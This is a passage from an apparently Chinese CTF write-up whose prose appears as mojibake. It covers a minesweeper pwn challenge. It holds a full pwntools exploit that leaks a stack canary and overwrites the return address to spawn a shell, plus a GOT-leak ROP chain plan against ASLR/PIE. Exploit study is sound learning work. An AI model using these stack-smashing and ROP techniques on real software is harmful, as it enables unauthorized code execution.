class="number">00</span> <span class="number">00</span> lea    <span class="number">0xd4b</span>(%rip),%rax        # <span class="number">402010</span> &lt;_IO_stdin_used+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">4012</span>c5:<span class="number">48</span> <span class="number">89</span> c7             mov    %rax,%rdi</span><br><span class="line">  <span class="number">4012</span>c8:e8 <span class="number">83</span> fe ff ff       call   <span class="number">401150</span> &lt;system@plt&gt;</span><br><span class="line">  <span class="number">4012</span>cd:<span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">4012</span>ce:<span class="number">5</span>d                   pop    %rbp</span><br><span class="line">  <span class="number">4012</span>cf:c3                   ret    </span><br></pre></td></tr></table></figure><blockquote><p>é‚£ä¹ˆä¸ºä»€ä¹ˆæ— æ³•ç›´æ¥è·³åˆ° <code>endbr64</code>ï¼Ÿ</p></blockquote><p>è¿™æ˜¯å› ä¸º<code>endbr64</code> ä¸æ˜¯ä»»æ„å¯æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œ<strong>è¦æˆåŠŸæ‰§è¡Œ <code>endbr64</code>ï¼Œç³»ç»Ÿå¿…é¡»å¯ç”¨äº† CET/IBT ä¸”è¯¥æŒ‡ä»¤å‡ºç°åœ¨åˆæ³•çš„é—´æ¥è·³è½¬ç›®æ ‡å¤„</strong>ï¼Œå¦åˆ™ä¼šäº§ç”Ÿ <strong>#CP (Control Protection Exception)</strong>ã€‚IBT (Indirect Branch Tracking) æœºåˆ¶åªå…è®¸è¿™ä¸¤ç±»è·³è½¬åˆ° <code>endbr64</code>:</p><ul><li><code>jmp reg</code> ï¼šç›´æ¥ä»å¯„å­˜å™¨è·³è½¬ï¼Œæ¯”å¦‚ <code>jmp rax</code></li><li><code>call reg</code> ï¼šé—´æ¥è°ƒç”¨ï¼Œæ¯”å¦‚ <code>call rbx</code><br>è¿™ä¸¤ç§è·³è½¬è¢« IBT æ ‡è®°ä¸ºâ€œåˆæ³•çš„<strong>é—´æ¥è·³è½¬å…¥å£æ£€æŸ¥</strong>â€ ï¼Œç”±äº <code>ret</code> æœ¬è´¨ä¸Šæ˜¯ <code>pop rip</code>ï¼Œæ‰€ä»¥ç›´æ¥è¢« CET IBT ç»™æ‹¦æˆªäº†ã€‚<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/d1_flag.png" alt="d1_flag.png"></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = &lt;port&gt;</span><br><span class="line">  </span><br><span class="line"><span class="comment"># win å‡½æ•°çš„åœ°å€</span></span><br><span class="line">WIN_ADDRESS = <span class="number">0x00000000004012be</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># vuln å‡½æ•°ä¸­ buf åˆ°è¿”å›åœ°å€çš„åç§»é‡</span></span><br><span class="line"><span class="comment"># 16 bytes buf + 8 bytes padding + 8 bytes canary + 8 bytes saved RBP = 40 bytes</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset from the start of buf to the canary</span></span><br><span class="line"><span class="comment"># 16 bytes buf + 8 bytes padding = 24 bytes</span></span><br><span class="line">CANARY_OFFSET_FROM_BUF = <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_minesweeper</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;å¼€å§‹è§£å†³æ‰«é›·æ¸¸æˆ...&quot;</span>)</span><br><span class="line">Â  Â  <span class="comment">#....</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># ç­‰å¾…èƒœåˆ©æç¤ºç¬¦ï¼Œè¿›å…¥ vuln å‡½æ•°</span></span><br><span class="line">Â  Â  r.recvuntil(<span class="string">b&quot;You win! Please sign your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary_and_exploit</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;è¿›å…¥æ¼æ´åˆ©ç”¨é˜¶æ®µ...&quot;</span>)</span><br><span class="line">Â  Â  <span class="comment"># sendline ä¼šè‡ªåŠ¨æ·»åŠ æ¢è¡Œç¬¦ï¼Œè¦†ç›–é‡‘ä¸é›€ç¬¬ä¸€ä¸ªå­—èŠ‚ (\x00)</span></span><br><span class="line">Â  Â  leak_padding_size = CANARY_OFFSET_FROM_BUF <span class="comment"># 24 bytes padding</span></span><br><span class="line">Â  Â  leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€æ³„éœ² payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># å‘é€æ³„éœ² payload</span></span><br><span class="line">Â  Â  r.sendline(leak_payload)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;æ³„éœ² payload å·²å‘é€ã€‚ç­‰å¾… Leaderboard...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># æ¥æ”¶åŒ…å«é‡‘ä¸é›€çš„è¾“å‡ºè¡Œ</span></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;æ¥æ”¶è¾“å‡ºä»¥æ³„éœ²é‡‘ä¸é›€...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">&quot;æ¥æ”¶åˆ° Leaderboard æ ‡è®°ã€‚å‡†å¤‡æ¥æ”¶æ³„éœ²è¡Œ...&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="comment"># å°è¯•æ¥æ”¶åŒ…å«å¡«å……çš„é‚£ä¸€è¡Œï¼Œç„¶åæ¥æ”¶ä¸‹ä¸€è¡Œï¼ˆåŒ…å«é‡‘ä¸é›€ï¼‰</span></span><br><span class="line">Â  Â  Â  Â  padding_line = r.recvline() <span class="comment"># æ¥æ”¶æ‰“å°å¡«å……å’Œæ¢è¡Œç¬¦çš„é‚£ä¸€è¡Œ</span></span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">f&quot;æ¥æ”¶åˆ°å¡«å……è¡Œ: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  canary_line = r.recvline() <span class="comment"># æ¥æ”¶æ‰“å°é‡‘ä¸é›€å¼€å§‹çš„é‚£ä¸€è¡Œ</span></span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„é‡‘ä¸é›€è¡Œ: <span class="subst">&#123;canary_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># ä»é‡‘ä¸é›€è¡Œä¸­è§£æé‡‘ä¸é›€çš„å 7 ä¸ªå­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â  canary_7_bytes = canary_line[:<span class="number">7</span>] <span class="comment"># æå–å‰ 7 ä¸ªå­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># é‡æ„å®Œæ•´çš„ 8 å­—èŠ‚é‡‘ä¸é›€ï¼š \x00 + å 7 ä¸ªå­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â  canary_value_bytes = <span class="string">b&#x27;\x00&#x27;</span> + canary_7_bytes</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;æˆåŠŸæå–é‡‘ä¸é›€ï¼ˆé‡æ„å‰ 7 å­—èŠ‚ï¼‰: <span class="subst">&#123;canary_7_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„é‡‘ä¸é›€: <span class="subst">&#123;canary_value_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">len</span>(canary_value_bytes) != <span class="number">8</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.warning(<span class="string">f&quot;é‡æ„åçš„é‡‘ä¸é›€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(canary_value_bytes)&#125;</span>)ï¼Œå¯èƒ½æå–é”™è¯¯æˆ–é‡‘ä¸é›€ç»“æ„ä¸åŒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.info(<span class="string">f&quot;é‡‘ä¸é›€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;canary_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;è¿æ¥åœ¨æ³„éœ²é˜¶æ®µå…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;å¯èƒ½æ³„éœ² payload å¯¼è‡´ç¨‹åºç«‹å³å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">f&quot;è§£æè¾“å‡ºæ—¶å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># --- æ„é€ å¹¶å‘é€ç¬¬äºŒæ¬¡ exploit payload ---</span></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;ç­‰å¾…ä¸‹ä¸€è½®è¾“å…¥æç¤ºç¬¦...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&quot;Just give us another shorter nickname: &quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">&quot;æ¥æ”¶åˆ°æç¤ºç¬¦ã€‚å‡†å¤‡å‘é€ exploit payload...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">&quot;è¿æ¥åœ¨æ¥æ”¶ä¸‹ä¸€è½®è¾“å…¥æç¤ºç¬¦æ—¶å…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">&quot;å¯èƒ½ç¨‹åºåœ¨ç­‰å¾…è¾“å…¥å‰å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># å¡«å…… (åˆ°è¾¾é‡‘ä¸é›€ä½ç½®å‰): buf 16 bytes + padding 8 bytes = 24 bytes</span></span><br><span class="line">Â  Â  padding_before_canary = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Â  Â  padding_after_canary = <span class="string">b&#x27;B&#x27;</span> * (PAYLOAD_OFFSET - CANARY_OFFSET_FROM_BUF - <span class="number">8</span>)</span><br><span class="line">Â  Â  <span class="comment"># win å‡½æ•°åœ°å€ (8 å­—èŠ‚å°ç«¯åº)</span></span><br><span class="line">Â  Â  win_address_bytes = p64(WIN_ADDRESS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># æœ€ç»ˆ payload = å¡«å…… + é‡‘ä¸é›€ + RBP å¡«å…… + è¿”å›åœ°å€</span></span><br><span class="line">Â  Â  exploit_payload = padding_before_canary + canary_value_bytes + padding_after_canary + win_address_bytes</span><br><span class="line">  </span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€ exploit payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(exploit_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">Â  Â  r.sendline(exploit_payload) <span class="comment"># ä½¿ç”¨ sendline å‘é€æœ€ç»ˆ payload</span></span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;Exploit payload å·²å‘é€ã€‚&quot;</span>)</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;Payload å·²å‘é€ã€‚å°è¯•ä¸ shell äº¤äº’...&quot;</span>)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;Exploit payload å·²å‘é€ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  r.recvuntil(<span class="string">b&quot;Thanks for playing my game.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»ç¨‹åºå…¥å£</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">Â  Â  context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">Â  Â  context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  </span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  conn = remote(HOST, PORT)</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æˆåŠŸè¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">f&quot;è¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  exit()</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># è§£å†³æ‰«é›·æ¸¸æˆ</span></span><br><span class="line">Â  Â  solve_minesweeper(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># è·å–é‡‘ä¸é›€å¹¶å‘é€ exploit payload</span></span><br><span class="line">Â  Â  get_canary_and_exploit(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  conn.close()</span><br></pre></td></tr></table></figure><h1 id="wmc25-d2"><a class="markdownIt-Anchor" href="#wmc25-d2"></a> WMC25 D2</h1><p>éš¾åº¦å†æ¬¡å‡çº§ï¼è¿™æ¬¡ç›´æ¥æŠŠåé—¨å‡½æ•° <code>win</code>ç»™å»æ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä½•æ‰§è¡Œä¹‹å‰çš„ <code>system(&quot;/bin/sh&quot;)</code> ï¼Ÿè¿™ä¸ªè¯­å¥æ ¹æœ¬ä¸åœ¨ç¼–è¯‘åçš„å¯é“¾æ¥ç¨‹åºé‡Œï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; <span class="built_in">printf</span>(<span class="string">&quot;You are the W4ter Minesweeper Champion (WMC) !\n&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œä¸ä»…äºæ­¤ï¼ç¨‹åºè¿˜ä½¿ç”¨äº†åœ°å€ç©ºé—´éšæœºåŒ– ASLRï¼Œç¼–è¯‘å¼€å¯ PIEï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€æ¬¡ executable åŠ è½½çš„åŸºåœ°å€æ˜¯ä¸ç¡®å®šçš„ï¼ˆä½†ä¸€èˆ¬é«˜å­—èŠ‚ä¸º<code>0x55</code>ï¼‰ï¼Œè€Œä¸”åŠ¨æ€åº“ <code>libc</code> åŠ è½½çš„åŸºåœ°å€ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼ˆä¸€èˆ¬ä¸ºé«˜å­—èŠ‚ä¸º <code>0x7f</code>ï¼Œä½†æ˜¯è¦åŒºåˆ«äºç”¨æˆ·ç¨‹åºæ ˆï¼‰ï¼</p><h2 id="-code9-"><a class="markdownIt-Anchor" href="#-code9-"></a> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO            FULL RELRO</span><br><span class="line">STACK CANARY     Canary found</span><br><span class="line">NX               NX enabled</span><br><span class="line">PIE              PIE enabled</span><br><span class="line">RPATH            No RPATH</span><br></pre></td></tr></table></figure></h2><p><code>system</code> å‡½æ•°ä»¥åŠ <code>/bin/sh</code> å­—ç¬¦ä¸²å…¶å®éƒ½ä½äºåŠ¨æ€åº“ <code>libc.so.6</code> é‡Œï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¯»å– libc é‡Œé¢çš„ <code>.rodata</code> å¹¶æ‰§è¡Œ <code>.text</code> é‡Œçš„å‡½æ•°å‘¢ï¼Œé‚£ä¹ˆå°±å¾—çŸ¥é“ libc è¢«åŠ è½½çš„åŸºåœ°å€ï¼</p><h3 id="putsplt-æ‰“å°-libc-å‡½æ•°åœ°å€"><a class="markdownIt-Anchor" href="#putsplt-æ‰“å°-libc-å‡½æ•°åœ°å€"></a> &lt;puts@plt&gt; æ‰“å° libc å‡½æ•°åœ°å€</h3><p>ç¬¬ä¸€æ¬¡çš„æƒ³æ³•æ˜¯é€šè¿‡ç¨‹åºé‡Œçš„ <code>&lt;puts@plt&gt;</code>  è·³è½¬åˆ°åœ¨ <code>libc</code> åœ°å€ç©ºé—´ä¸­å®é™…æ‰§è¡Œ <code>puts</code> å‡½æ•°çš„ <code>puts@got</code> ï¼Œé€šè¿‡<code>puts@plt(read@got)</code> æ‰“å° <code>read</code> çš„å®é™…åœ°å€ã€‚å¾—åˆ°å®é™…åœ°å€åå‡å»<code>read</code>åœ¨ libc ä¸­å›ºå®šçš„åç§»é‡å°±èƒ½å¾—åˆ° libc è¿è¡Œæ—¶çš„åŸºå€äº†ï¼å‡½æ•°åœ¨ PLT è¡¨ä¸­çš„åç§»é‡æˆ‘ä»¬å¯ä»¥åæ±‡ç¼– executable å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt.sec:</span><br><span class="line"></span><br><span class="line">0000000000001120 &lt;puts@plt&gt;:</span><br><span class="line">    1120:f3 0f 1e fa          endbr64 </span><br><span class="line">    1124:f2 ff 25 5d 2e 00 00 bnd jmp *0x2e5d(%rip)        # 3f88 &lt;puts@GLIBC_2.2.5&gt;</span><br><span class="line">    112b:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000001140 &lt;__stack_chk_fail@plt&gt;:</span><br><span class="line">    1140:f3 0f 1e fa          endbr64 </span><br><span class="line">    1144:f2 ff 25 4d 2e 00 00 bnd jmp *0x2e4d(%rip)        # 3f98 &lt;__stack_chk_fail@GLIBC_2.4&gt;</span><br><span class="line">    114b:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000001170 &lt;read@plt&gt;:</span><br><span class="line">    1170:f3 0f 1e fa          endbr64 </span><br><span class="line">    1174:f2 ff 25 35 2e 00 00 bnd jmp *0x2e35(%rip)        # 3fb0 &lt;read@GLIBC_2.2.5&gt;</span><br><span class="line">    117b:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¸€ä¸‹ <code>read@got</code> çš„åœ°å€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r ./pwn | grep <span class="built_in">read</span>  æˆ– objdump -R ./demo</span><br><span class="line">000000003fb0  R_X86_64_JUMP_SLO 0000000000000000 <span class="built_in">read</span>@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>0x3fb0</code> æ˜¯ <code>read@got</code> è¿™ä¸€é¡¹<strong>åœ¨è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„åœ°å€</strong> ã€‚å®ƒçš„<strong>åˆå§‹å†…å®¹ï¼ˆå€¼ï¼‰æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€</strong>ï¼ŒæŒ‡å‘æ‡’ç»‘å®šè§£æå™¨ï¼Œæ¯”å¦‚ <code>ld.so</code> çš„ <code>_dl_runtime_resolve</code>ã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>read@plt</code>ï¼Œè§£æå™¨è§£æç¬¦å·å¹¶æ›´æ–° <code>0x3fb0</code> çš„å†…å®¹ä¸º <code>libc</code> ä¸­ <code>read()</code> çš„çœŸå®åœ°å€ï¼Œæ¯”å¦‚ <code>0x7ffff7d12345</code>ã€‚å…·ä½“è§£æè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[è°ƒç”¨ read@plt]</span><br><span class="line">   â†“</span><br><span class="line">jmp *[read@got]  â† é—´æ¥è·³è½¬</span><br><span class="line">       â†“</span><br><span class="line">     å¦‚æœé¦–æ¬¡è°ƒç”¨ â†’ ld.so è§£æç¬¦å· â†’ æŠŠ libc ä¸­ read çš„åœ°å€å†™å…¥ read@got</span><br><span class="line">     å¦åˆ™        â†’ ç›´æ¥è·³åˆ° libc ä¸­çš„ read å‡½æ•°</span><br></pre></td></tr></table></figure><p>å‡½æ•°å’Œå‚æ•°éƒ½å·²é½å…¨ï¼Œæ¥ä¸‹æ¥éœ€è¦è€ƒè™‘å¦‚ä½•ä¼ å‚ã€‚x86-64 ABI è§„å®šç¬¬ä¸€ä¸ªå‚æ•°ç”¨<code>rdi</code>æ¥ä¼ é€’ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¯æ‰§è¡Œç¨‹åºä¸­æ‰¾åˆ°ä¸€ç§ <code>Gadget</code>ï¼Œå½¢å¦‚ <code>pop rdi ; ret</code>ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ„é€ å¦‚ä¸‹çš„ ROP é“¾ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ˆç”±ä¸Šå¾€ä¸‹åœ°å€å‡å°</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|      <span class="selector-tag">puts</span>@<span class="selector-tag">plt</span> (<span class="number">0</span>x1120)     | â† è°ƒç”¨ <span class="selector-tag">puts</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|      <span class="number">0</span><span class="selector-tag">x3fb0</span> (read<span class="variable">@got</span>)     | â† å‚æ•°</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| <span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> ; <span class="selector-tag">ret</span>  <span class="selector-tag">Gadget</span> <span class="selector-tag">addr</span> | â† æ§åˆ¶ <span class="selector-tag">rdi</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">old</span> <span class="selector-tag">rbp</span> <span class="selector-tag">value</span>        | </span><br><span class="line">+<span class="selector-tag">----------------------------</span>+ â†  %<span class="selector-tag">rbp</span></span><br></pre></td></tr></table></figure><p>ROP é“¾è®¾è®¡å®Œæ¯•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æœ€åä¸€æ­¥ï¼Œæ‰¾åˆ° 